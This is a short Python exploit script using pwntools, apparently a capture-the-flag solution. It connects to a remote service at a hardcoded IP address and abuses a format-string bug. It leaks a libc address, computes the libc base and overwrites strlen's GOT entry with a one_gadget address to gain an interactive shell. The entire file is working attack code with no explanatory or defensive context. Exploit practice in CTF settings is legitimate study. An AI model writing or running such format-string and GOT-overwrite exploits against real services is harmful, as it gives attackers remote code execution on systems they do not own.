from pwn import *
context.arch = "amd64"

p = remote("5.161.93.250", 42069)
p.sendline(b"%43$p")
p.recvline()
libc_leak = int(p.recvlineS(), 16)
libc_base = libc_leak - 0x29d90
strlen_got = libc_base + 0x21a098
og = 0xebc85
pay = fmtstr_payload(8, {strlen_got: og + libc_base}, badbytes=b"\x0a")
p.sendline(pay)
p.clean(timeout=0.1)
p.interactive()
